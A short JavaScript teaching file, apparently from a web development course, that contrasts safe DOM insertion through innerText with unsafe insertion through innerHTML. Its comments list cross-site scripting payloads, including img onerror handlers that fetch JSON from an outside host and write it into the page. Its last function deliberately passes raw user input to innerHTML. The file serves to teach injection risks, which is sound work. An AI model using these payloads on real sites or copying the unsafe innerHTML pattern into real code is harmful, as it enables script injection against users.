function injectDOMOperations(title) {
  const parentElement = document.getElementById('output');

  while (parentElement.firstChild) {
    parentElement.removeChild(parentElement.firstChild);
  }

  const newElement = document.createElement('h3');
  newElement.innerText = title;
  parentElement.appendChild(newElement);
}

function injectDOMHTML(title) {
  const parentElement = document.getElementById('output');

  parentElement.innerHTML = `<h3>${title}</h3>`;
}

// <b style="color:red">hello</b>
// <script>alert("danger")</script>
// <img src='x' onerror='alert("danger")'/>
// <img src='x' onerror="fetch('https://cs260.click/hacked.json').then(r=>r.json()).then(j=>console.log(j))"/>
// <img src='x' onerror="fetch('https://cs260.click/hacked.json').then(r=>r.json()).then(j=>document.getElementById('output').innerHTML =j.msg)"/>

function injectHTMLFromInput() {
  const inputElement = document.getElementById('html-text');
  const parentElement = document.getElementById('output');

  parentElement.innerHTML = inputElement.value;
}
